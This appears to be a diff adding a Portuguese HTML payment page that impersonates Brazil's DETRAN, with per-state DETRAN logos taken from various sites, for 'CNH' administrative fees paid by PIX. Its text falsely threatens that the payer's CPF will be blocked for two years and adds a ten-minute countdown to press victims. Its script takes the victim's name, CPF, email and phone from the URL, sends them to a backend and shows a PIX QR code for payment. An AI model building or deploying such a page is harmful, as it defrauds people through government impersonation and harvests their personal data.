@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Pagamento via PIX - CNH do Brasil</title>
+  <style>
+    :root {
+      --bg: #f3f5f9;
+      --card-border: #d6dbe3;
+      --muted: #6b7280;
+      --primary: #1d4ed8;
+      --primary-dark: #163fa9;
+      --danger: #ef4444;
+      --warning: #f59e0b;
+    }
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+      background: var(--bg);
+      color: #111827;
+    }
+    .page {
+      min-height: 100vh;
+      display: flex;
+      align-items: flex-start;
+      justify-content: center;
+      padding: 24px 16px 48px;
+    }
+    .stack {
+      width: 100%;
+      max-width: 360px;
+    }
+    .notice {
+      background: #fff7e0;
+      border: 1px solid #ffe3a3;
+      border-radius: 8px;
+      padding: 12px 14px;
+      font-size: 12px;
+      color: #7c4a00;
+      margin-bottom: 12px;
+    }
+    .notice strong { display: block; margin-bottom: 4px; }
+    .timer {
+      background: #ffecec;
+      border: 1px solid #ffc7c7;
+      border-radius: 8px;
+      padding: 12px 14px;
+      text-align: center;
+      color: #b91c1c;
+      font-weight: 700;
+      margin-bottom: 14px;
+    }
+    .card {
+      background: #fff;
+      border: 1px solid var(--card-border);
+      border-radius: 8px;
+      overflow: hidden;
+      box-shadow: 0 6px 18px rgba(15, 23, 42, 0.08);
+    }
+    .card-header {
+      padding: 14px 16px 8px;
+      border-bottom: 1px solid var(--card-border);
+      text-align: center;
+    }
+    .card-header img {
+      height: 42px;
+      max-width: 180px;
+      object-fit: contain;
+      display: block;
+      margin: 0 auto 6px;
+    }
+    .card-header .title {
+      font-size: 12px;
+      font-weight: 700;
+      color: #111827;
+    }
+    .card-header .subtitle {
+      font-size: 10px;
+      color: var(--muted);
+    }
+    .card-body {
+      padding: 14px 16px;
+      font-size: 12px;
+    }
+    .row {
+      display: flex;
+      justify-content: space-between;
+      gap: 12px;
+      margin-bottom: 8px;
+    }
+    .row .label { color: var(--muted); font-size: 10px; }
+    .row .value { font-weight: 700; font-size: 12px; }
+    .divider { height: 1px; background: var(--card-border); margin: 10px 0; }
+    .qr-section {
+      background: #eaf2ff;
+      padding: 12px;
+      border-radius: 6px;
+      border: 1px solid #c7dbff;
+      text-align: center;
+      margin: 10px 0;
+    }
+    .qr-section img { width: 180px; height: 180px; display: block; margin: 0 auto 6px; }
+    .pix-code {
+      background: #f8fafc;
+      border: 1px solid #d2d8e2;
+      border-radius: 6px;
+      padding: 8px;
+      font-size: 10px;
+      word-break: break-all;
+    }
+    .copy-btn {
+      width: 100%;
+      background: var(--primary);
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      padding: 10px 12px;
+      font-weight: 700;
+      margin-top: 10px;
+      cursor: pointer;
+    }
+    .copy-btn:hover { background: var(--primary-dark); }
+    .steps {
+      background: #eef6ff;
+      border: 1px solid #c9dcf4;
+      border-radius: 6px;
+      padding: 10px 12px;
+      font-size: 11px;
+      margin-top: 12px;
+    }
+    .footer {
+      margin-top: 12px;
+      text-align: center;
+      font-size: 10px;
+      color: var(--muted);
+    }
+  </style>
+  <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
+</head>
+<body>
+  <div class="page">
+    <div class="stack">
+      <div class="notice">
+        <strong>⚠ PAGAMENTO OBRIGATÓRIO</strong>
+        O pagamento das taxas administrativas é obrigatório para garantir sua vaga. Caso não seja realizado, seu CPF ficará bloqueado por 2 anos.
+      </div>
+      <div class="timer">A guia de pagamento vence em: <span id="timer">10:00</span></div>
+
+      <div class="card">
+        <div class="card-header">
+          <img id="detran-logo" alt="DETRAN" />
+          <div class="title" id="detran-title">DETRAN/UF - GUIA DE RECOLHIMENTO</div>
+          <div class="subtitle">TAXAS ADMINISTRATIVAS CNH</div>
+        </div>
+        <div class="card-body">
+          <div class="row">
+            <div>
+              <div class="label">CONTRIBUINTE</div>
+              <div class="value" id="nome">-</div>
+            </div>
+            <div>
+              <div class="label">CPF</div>
+              <div class="value" id="cpf">-</div>
+            </div>
+          </div>
+          <div class="divider"></div>
+          <div class="row">
+            <div>
+              <div class="label">STATUS</div>
+              <div class="value" id="status">PENDENTE</div>
+            </div>
+            <div>
+              <div class="label">VALOR</div>
+              <div class="value" id="amount">-</div>
+            </div>
+          </div>
+
+          <div class="qr-section">
+            <div style="font-size:11px; margin-bottom:6px;">DETRAN/UF - PAGAMENTO VIA PIX</div>
+            <img id="qr" alt="QR Code PIX" />
+            <div style="font-size:10px; color:#475569;">Escaneie o QR Code com o app do seu banco</div>
+          </div>
+
+          <div class="label">CÓDIGO PIX COPIA E COLA:</div>
+          <div id="pix-code" class="pix-code">-</div>
+          <button id="copy" class="copy-btn">Copiar Código PIX</button>
+
+          <div class="steps">
+            <strong>Como pagar:</strong>
+            <ol style="margin:6px 0 0 16px; padding:0;">
+              <li>Abra o app do seu banco</li>
+              <li>Acesse a opção PIX</li>
+              <li>Escaneie o QR Code ou cole o código PIX</li>
+              <li>Confirme o pagamento</li>
+            </ol>
+          </div>
+        </div>
+      </div>
+      <div class="footer">Assim que o pagamento for confirmado, você será direcionado automaticamente.</div>
+    </div>
+  </div>
+
+  <script>
+    const params = new URLSearchParams(window.location.search);
+    const data = {
+      cpf: params.get("cpf") || "",
+      nome: params.get("nome") || "",
+      email: params.get("email") || "",
+      phone: params.get("phone") || "",
+      amount: params.get("amount") || "64.73",
+      title: params.get("title") || "Taxa de Adesão",
+      uf: params.get("uf") || "",
+      detran: params.get("detran") || "",
+    };
+
+    const detranLogoByUf = {
+      AC: "https://www.agencia.ac.gov.br/wp-content/uploads/2019/07/Nova-Logo-Detran-Acre-2019-2-800x416.png",
+      AL: "https://seeklogo.com/images/D/detran-alagoas-logo-C0D07878CA-seeklogo.com.png",
+      AP: "https://www.exametoxicologico.com.br/wp-content/uploads/2019/03/Detran-Amapa-ap-exame-toxicologico.jpg",
+      AM: "https://apstatic.prodam.am.gov.br/images/detran/logo-detran-horizontal.png",
+      BA: "https://images.seeklogo.com/logo-png/39/1/detran-bahia-logo-png_seeklogo-395407.png",
+      CE: "https://www.detran.ce.gov.br/wp-content/uploads/2018/04/logo_detran_2018.png",
+      DF: "https://zpy-customer-communication-cms-strapi-images-2.s3.amazonaws.com/DETRAN_DF_378eeacd03.webp",
+      ES: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRbFOyL7H4mp0igBsJUKg3y4m_7mg9xkqXPnQ&s",
+      GO: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTmmhmirDeoyas3iEHwHapMrQ3vIHa0ivq3wQ&s",
+      MA: "https://seeklogo.com/images/D/detran-maranhao-logo-4F04A57787-seeklogo.com.png",
+      MT: "https://portalcredenciamento.detran.mt.gov.br/815ed82f649be4cc8df5e9e024e23482.png",
+      MS: "https://d1yjjnpx0p53s8.cloudfront.net/styles/logo-thumbnail/s3/082015/detranms_0.png?itok=oDYhYuLp",
+      MG: "https://www.camarauberlandia.mg.gov.br/DETRANMG.jpg/@@images/480d676e-e0af-433a-bec8-d9676a937a59.jpeg",
+      PA: "https://www.roservalramos.com.br/wp-content/uploads/2020/01/detran-pa-consulta.jpg",
+      PB: "https://www.segundaviadetudo.com.br/wp-content/uploads/2020/07/Logo-Detran-PB.png",
+      PR: "https://reciclagemcnhonline.com.br/wp-content/uploads/2024/08/Detran-PR-600x170.png",
+      PE: "https://www.detran.pe.gov.br/images/FOTO%202022/Design%20sem%20nome%204.jpg",
+      PI: "https://conteudo.consultapelaplaca.com.br/wp-content/uploads/2024/10/Detran-PI-IPVA-PI-2024-1.jpg",
+      RJ: "https://odia.ig.com.br/_midias/jpg/2020/07/27/1140x632/1_detran_rj_2020_1280x720-18488499.jpg",
+      RN: "https://www.novacruz.rn.leg.br/detran.png/image_preview",
+      RS: "https://yt3.googleusercontent.com/JMoN0dwOBMHH6MLzGDD9m9QKYTTXKNqSeZHKwO46Zg006Nl-Yf4Ug17edHRcVDPQUYewi03ApQ=s900-c-k-c0x00ffffff-no-rj",
+      RO: "https://portaleducacional.detran.ro.gov.br/Content/images/LogoDetranGrandel.png",
+      RR: "https://www.detran.rr.gov.br/wp-content/uploads/2021/09/logotipo-detran-rr.png",
+      SC: "https://servicos.detran.sc.gov.br/images/og-image.png",
+      SP: "https://grandesnomesdapropaganda.com.br/wp-content/uploads/2014/09/Logo-detran-SP.jpg",
+      SE: "https://images.seeklogo.com/logo-png/55/1/detran-se-logo-png_seeklogo-550201.png",
+      TO: "https://www.exametoxicologico.com.br/wp-content/uploads/2019/03/detran-to-exame-toxicologico.jpg",
+    };
+
+    const detranUf = (data.uf || data.detran || "").replace("DETRAN/", "").trim().toUpperCase();
+    const detranLabel = detranUf ? `DETRAN/${detranUf}` : "DETRAN";
+    document.getElementById("detran-title").textContent = `${detranLabel} - GUIA DE RECOLHIMENTO`;
+    const logo = detranLogoByUf[detranUf] || "";
+    const logoEl = document.getElementById("detran-logo");
+    if (logo) logoEl.src = logo; else logoEl.style.display = "none";
+
+    document.getElementById("nome").textContent = data.nome || "-";
+    document.getElementById("cpf").textContent = data.cpf || "-";
+    document.getElementById("amount").textContent = `R$ ${Number(data.amount).toFixed(2)}`.replace(".", ",");
+
+    let remaining = 10 * 60;
+    const timerEl = document.getElementById("timer");
+    setInterval(() => {
+      if (remaining <= 0) return;
+      remaining -= 1;
+      const m = String(Math.floor(remaining / 60)).padStart(2, "0");
+      const s = String(remaining % 60).padStart(2, "0");
+      timerEl.textContent = `${m}:${s}`;
+    }, 1000);
+
+    async function createPix() {
+      if (!data.cpf || !data.nome || !data.email) return;
+      const payload = {
+        cpf: data.cpf,
+        nome: data.nome,
+        email: data.email,
+        phone: data.phone || "",
+        amount: data.amount,
+        title: data.title,
+        uf: detranUf,
+      };
+      const resp = await fetch("/api/payment", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload),
+      });
+      const json = await resp.json();
+      if (!json.success) {
+        document.getElementById("status").textContent = "ERRO";
+        return;
+      }
+      document.getElementById("status").textContent = "PENDENTE";
+      document.getElementById("pix-code").textContent = json.pix_code || "";
+      const pixText = json.pix_code || "";
+      const qr = await QRCode.toDataURL(pixText, { width: 180, margin: 1 });
+      document.getElementById("qr").src = qr;
+    }
+
+    document.getElementById("copy").addEventListener("click", async () => {
+      const text = document.getElementById("pix-code").textContent;
+      if (!text) return;
+      await navigator.clipboard.writeText(text);
+      document.getElementById("copy").textContent = "Copiado!";
+      setTimeout(() => (document.getElementById("copy").textContent = "Copiar Código PIX"), 1500);
+    });
+
+    createPix().catch(() => {});
+  </script>
+</body>
+</html>
